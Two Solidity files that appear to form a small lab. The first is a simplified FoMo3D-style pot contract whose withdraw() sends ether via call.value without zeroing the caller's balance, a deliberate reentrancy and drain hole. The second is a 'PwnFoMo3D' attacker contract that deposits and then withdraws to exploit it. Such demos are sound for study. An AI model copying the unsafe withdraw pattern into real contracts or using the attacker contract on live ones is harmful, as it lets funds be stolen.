pragma solidity ^0.4.24;


library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    // Gas optimization: this is cheaper than asserting 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    if (a == 0) {
      return 0;
    }

    c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    // uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return a / b;
  }

  /**
  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}


contract FoMo3Dlong {
    using SafeMath for *;


    uint256 public airDropPot = 0;
    uint256 public total_Pot = 0;


    address public teamAddress;
    mapping (address => uint256) public playerWallet;
    uint256 fraction = 10;
    constructor() public  {
        teamAddress = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c;
    }
    function input() public payable {
        
        playerWallet[msg.sender] = msg.value;
        total_Pot = total_Pot.add(msg.value);
        
        airDropPot = total_Pot.div(fraction); //the airdrop part is 1/10 of the total. 
        
        
    }
        

    function withdraw() public{
       
            uint256 amount  = playerWallet[msg.sender];
            total_Pot=total_Pot.sub(amount);
            airDropPot = total_Pot.div(fraction);
            require(msg.sender.call.value(amount)());
     //       msg.sender.transfer(amount);
        //    msg.sender.call.value(amount)();
  //              playerWallet[msg.sender] = amount;
   //             total_Pot=total_Pot.sub(amount);
  //              airDropPot = total_Pot.div(fraction);
     //           return false;
    //         return(true);

           
//        return(false);
        
    }

    function totether() public returns(uint256){
        return(this.balance);
    }
}
pragma solidity ^0.4.24;

interface FoMo3DlongInterface {
  function withdraw() external;
  function input() external ;
}



contract PwnFoMo3D {
    address owner;
    address addr =0x692a70d2e424a56d2c6c27aa97d1a86395877b3a;
    constructor() public payable {
        owner = msg.sender;
    }
    FoMo3DlongInterface fomo3d = FoMo3DlongInterface(addr);

  function totether() public view returns(uint256){
        return(this.balance);
  }
  function deposite() public payable returns(uint256){
 
      addr.call.value(1 ether)(bytes4(keccak256("input()")));

  }
  function with()  public payable {
      fomo3d.withdraw();
    //  addr.delegatecall(bytes4(keccak256("withdraw()")));
  }
}





